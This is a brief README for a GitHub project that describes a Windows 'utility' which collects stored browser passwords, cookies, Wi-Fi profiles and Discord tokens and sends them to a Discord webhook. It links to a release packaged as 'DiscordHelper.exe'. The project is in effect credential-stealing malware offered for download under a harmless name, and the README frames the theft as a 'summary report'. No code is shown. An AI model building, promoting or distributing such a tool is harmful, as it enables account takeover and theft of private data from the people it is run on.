# Project GetBack

A lightweight utility that gathers locally stored browser credentials, cookies,
Wi-Fi profiles, and Discord tokens and reports them via webhook.

## What it does

Runs on Windows, scans for locally stored data, and sends a summary report to a
Discord webhook. No installation or external dependencies required.

## Build

Built automatically on every push via GitHub Actions (`windows-latest`) and
packaged with PyInstaller.

## Download

Grab the latest `DiscordHelper.exe` from the
[Releases](https://github.com/AlainDorestant/project_getback/releases) page.
